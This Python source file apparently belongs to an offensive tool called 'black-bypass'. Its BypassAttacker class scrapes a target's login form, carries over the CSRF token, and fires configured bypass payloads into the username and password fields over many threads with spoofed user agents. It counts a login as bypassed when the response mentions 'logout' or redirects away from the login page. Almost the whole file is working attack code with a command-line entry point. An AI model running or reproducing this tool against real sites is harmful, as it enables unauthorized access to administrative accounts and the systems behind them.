import sys
import threading
import requests
from bs4 import BeautifulSoup
from termcolor import cprint
from .utils import load_config, get_random_user_agent, setup_logger

BSB_LOGO = r"""
┳┓┏┓┳┓
┣┫┗┓┣┫
┻┛┗┛┻┛
      """
class BypassAttacker:
    def __init__(self, login_url):
        self.login_url = login_url
        self.parsed = requests.utils.urlparse(login_url)
        self.logger = setup_logger('admin_bypass')
        cfg = load_config()
        self.timeout = cfg.get('DEFAULT_TIMEOUT', 10)
        self.payloads = cfg.get('BYPASS_PAYLOADS', [])
        self.headers = {'User-Agent': get_random_user_agent()}
        self.lock = threading.Lock()
        self.successful = False

    def attempt_bypass(self, payload):
        """
        প্রতিটি পে-লোড দিয়ে চেষ্টা করে সফল হলে থ্রেড বন্ধ।
        """
        if self.successful:
            return

        try:
            resp = requests.get(self.login_url, headers=self.headers, timeout=self.timeout)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, 'lxml')
            form = soup.find('form')
            if not form:
                cprint("[BSB] No login form found.", "red")
                self.successful = True  # আর চেষ্টা না করার জন্য
                return

            action = form.get('action') or self.login_url
            post_url = action if action.startswith('http') else self.login_url

            # ফিল্ড নাম ডিটেকশন
            inputs = form.find_all('input')
            uname_field = None
            pwd_field = None
            csrf_field = None
            csrf_value = None
            for inp in inputs:
                name = inp.get('name', '')
                t = inp.get('type', '')
                if 'user' in name.lower():
                    uname_field = name
                if 'pass' in name.lower():
                    pwd_field = name
                if t == 'hidden' and inp.get('value') and 'csrf' in name.lower():
                    csrf_field = name
                    csrf_value = inp.get('value')

            if not uname_field or not pwd_field:
                uname_field = uname_field or 'username'
                pwd_field = pwd_field or 'password'

            data = {uname_field: payload, pwd_field: payload}
            if csrf_field:
                data[csrf_field] = csrf_value

            attempt = requests.post(post_url, data=data, headers=self.headers, timeout=self.timeout, allow_redirects=False)
            location = attempt.headers.get('Location', '')
            text = attempt.text.lower()
            self.logger.info(f"Tried payload: {payload} -> Status: {attempt.status_code}")

            if 'logout' in text or (location and self.login_url not in location):
                with self.lock:
                    if not self.successful:
                        cprint(f"[BSB] Bypass successful with payload: {payload}", "red")
                        self.logger.warning(f"Bypass SUCCESS -> Payload: {payload}")
                        self.successful = True
        except Exception as e:
            self.logger.error(f"Error attempting payload {payload}: {e}")

    def run(self):
        cprint(BSB_LOGO, "cyan")
        cprint(f"[BSB] Attempting admin login bypass on: {self.login_url}", "green")

        threads = []
        for payload in self.payloads:
            if self.successful:
                break
            t = threading.Thread(target=self.attempt_bypass, args=(payload,))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if not self.successful:
            cprint("[BSB] All bypass attempts failed.", "blue")
            self.logger.info("All bypass payloads failed.")

def main():
    if len(sys.argv) != 2:
        cprint("Usage: black-bypass <login_page_url>", "yellow")
        return
    attacker = BypassAttacker(sys.argv[1])
    attacker.run()
